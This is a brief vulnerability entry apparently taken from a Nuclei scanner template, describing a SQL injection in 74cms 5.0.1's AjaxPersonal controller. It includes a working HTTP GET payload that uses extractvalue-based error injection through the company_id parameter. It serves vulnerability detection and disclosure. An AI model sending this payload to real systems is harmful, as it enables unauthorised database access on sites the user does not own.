# Vulnerability: 74cms Sql Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`74cms-sqli.yaml`)

## Description
A SQL injection vulnerability exists in 74cms 5.0.1 AjaxPersonalController.class.php.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test") and extractvalue(1,concat(0x7e,md5({{num}}))) -- a
```

